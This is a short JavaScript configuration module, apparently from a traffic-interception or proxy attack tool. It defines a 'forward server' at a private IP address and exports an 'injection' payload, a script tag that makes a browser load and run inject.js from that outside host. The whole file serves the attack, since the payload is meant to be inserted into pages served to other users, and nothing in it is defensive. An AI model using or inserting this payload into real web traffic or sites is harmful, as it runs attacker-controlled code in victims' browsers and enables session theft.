const forwardServer = {
	host: '172.16.113.130',
	port: 80
};

const injection = `<script src="http://${forwardServer.host}:${forwardServer.port}/inject.js"></script>`;

module.exports = {
	forwardServer,
	injection
};